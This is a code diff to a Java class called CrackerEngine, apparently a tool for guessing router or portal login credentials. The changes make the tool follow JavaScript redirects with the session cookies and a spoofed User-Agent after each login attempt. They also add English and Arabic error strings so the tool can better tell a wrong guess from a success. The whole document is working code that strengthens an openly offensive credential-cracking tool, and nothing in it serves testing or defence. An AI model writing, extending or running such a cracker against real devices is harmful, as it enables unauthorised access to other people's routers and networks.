@@ -280,9 +280,24 @@ public class CrackerEngine {
 
             if (stopped.get()) return Result.bad("stopped");
 
+            String redirectUrl = extractRedirectUrl(body);
+            if (redirectUrl != null) {
+                try {
+                    String fullUrl = redirectUrl.startsWith("http") ? redirectUrl : baseUrl + "/" + redirectUrl.replaceAll("^/", "");
+                    HttpURLConnection c5 = (HttpURLConnection) new URL(fullUrl).openConnection();
+                    c5.setConnectTimeout(4000); c5.setReadTimeout(4000);
+                    c5.setRequestProperty("User-Agent", ua);
+                    String ck3 = cookiesStr(cookies);
+                    if (!ck3.isEmpty()) c5.setRequestProperty("Cookie", ck3);
+                    String newBody = read(c5.getInputStream());
+                    c5.disconnect();
+                    body = newBody;
+                } catch (Exception e) {}
+            }
+            
             String low = body.toLowerCase();
             String respClean = body.replaceAll("<[^>]+>", " ").replaceAll("\\s+", " ").trim();
-            if (respClean.length() > 120) respClean = respClean.substring(0, 120) + "...";
+            if (respClean.length() > 150) respClean = respClean.substring(0, 150) + "...";
             if (body.contains("already authorizing") || low.contains("already authorizing")) {
                 Result rb = Result.busy("already authorizing");
                 rb.responseText = respClean;
@@ -310,7 +325,10 @@ public class CrackerEngine {
 
             // إذا وصلنا هنا، الراوتر لم يسجل الدخول. الآن نفحص لو كان الرد يحتوي على خطأ
             if (low.contains("invalid") || low.contains("error") 
-                || low.contains("wrong") || low.contains("denied")) {
+                || low.contains("wrong") || low.contains("denied")
+                || low.contains("expired") || low.contains("منتهي") 
+                || low.contains("غير صحيحة") || low.contains("غير صحيح")
+                || low.contains("انتهت") || low.contains("خطأ")) {
                 Result rb = Result.bad("خاطئ");
                 rb.responseText = respClean;
                 return rb;
@@ -419,6 +437,15 @@ public class CrackerEngine {
             }
         }
         return 30;
+    }
+    
+    
+    private String extractRedirectUrl(String html) {
+        java.util.regex.Pattern p = java.util.regex.Pattern.compile(
+            "(?:window\\.)?location\\.href\\s*=\\s*[\"']([^\"']+)[\"']");
+        java.util.regex.Matcher m = p.matcher(html);
+        if (m.find()) return m.group(1);
+        return null;
     }
     
     private void sleep(long ms) { try { Thread.sleep(ms); } catch (Exception e) {} }
